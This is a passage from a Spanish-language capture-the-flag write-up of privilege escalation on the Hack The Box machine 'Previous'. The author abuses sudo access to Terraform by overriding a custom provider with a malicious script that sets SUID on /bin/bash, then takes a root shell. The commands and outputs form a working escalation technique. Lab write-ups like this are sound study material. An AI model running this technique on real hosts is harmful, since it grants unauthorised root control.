drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root 1097 Jan  9 17:14 terraform.tfstate
```

No tenemos permisos de escritura, pero da igual. Vamos a leer el `main.tf`:

```typescript
jeremy@previous:~$ cat /opt/examples/main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

Hay una configuración que usa un provider llamado previous.htb/terraform/examples, el problema acá es que **terraform ejecuta providers customs cuando aplica cambios**.

El binario no pilla solo los archivos principales con las instrucciones a ejecutar desde `/opt` aunque en el comando a ejecutar como root se especifique dicha ruta, también lo hace desde `/usr/local/go/bin`. De esto nos damos cuenta con el output de terraform cuando lo tratamos de ejecutar como root:

```shell
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
[sudo] password for jeremy: 
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

Lo que nos chiva lo dicho es:

```shell
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
```

Esto significa que hay un **provider personalizado** instalado en `/usr/local/go/bin`.

Bien, hay dos variables de entorno de terraform que nos interesan bastante:

**`TF_CLI_CONFIG_FILE`**: Permite especificar un archivo de configuración personalizado.
**`dev_overrides`**: Dentro de la configuración, permite REDIRIGIR qué provider se usa.

Teniendo esto en cuenta, vamos primero a crear un nuevo provider malicioso en el servidor:

Terraform espera que los providers tengan este formato:

```text
terraform-provider-<NOMBRE>_v<VERSIÓN>_<OS>_<ARQUITECTURA>
```

Teniendo en cuenta esto creamos el provider, **que se encargará de añadirle permisos SUID a /bin/bash en este caso** y le damos permisos de ejecución:

```shell
jeremy@previous:~$ mkdir -p /home/jeremy/exploit
jeremy@previous:~$ cat > /home/jeremy/exploit/terraform-provider-examples_v9.9.9_linux_amd64 << 'EOF'
> #!/bin/bash
> chmod u+s /bin/bash
> EOF

jeremy@previous:~$ chmod +x /home/jeremy/exploit/terraform-provider-examples_v9.9.9_linux_amd64
```

Ahora crearemos una configuración para terraform que anulará el provider `previous.htb/terraform/examples`, y buscará el nuestro que acabamos de crear en `/home/jeremy/exploit`:

```shell
jeremy@previous:~$ cat > /home/jeremy/exploit/my_config.tfrc << 'EOF'
> provider_installation {
>   dev_overrides {
>     "previous.htb/terraform/examples" = "/home/jeremy/exploit"
>   }
>   direct {}
> }
> EOF
```

Establecemos la variable de entorno `TF_CLI_CONFIG_FILE` que mencionamos anteriormente para que use nuestro archivo de configuración en vez del default:

```shell
jeremy@previous:~$ export TF_CLI_CONFIG_FILE=/home/jeremy/exploit/my_config.tfrc
```

Ya con esto tenemos todo listo, solo queda ejecutar el binario con sudo:

```shell
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
[sudo] password for jeremy: 
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /home/jeremy/exploit
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to
│ instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /home/jeremy/exploit/terraform-provider-examples_v9.9.9_linux_amd64
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
╵
```

Vemos que el output ha cambiado y que ha ejecutado nuestro provider, añadiendo el permiso SUID a /bin/bash:

```shell
jeremy@previous:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash

jeremy@previous:~$ bash -p
bash-5.1# whoami
root
```

Hemos logrado vulnerar la máquina completamente.

```shell
bash-5.1# ls /root/root.txt 
/root/root.txt
```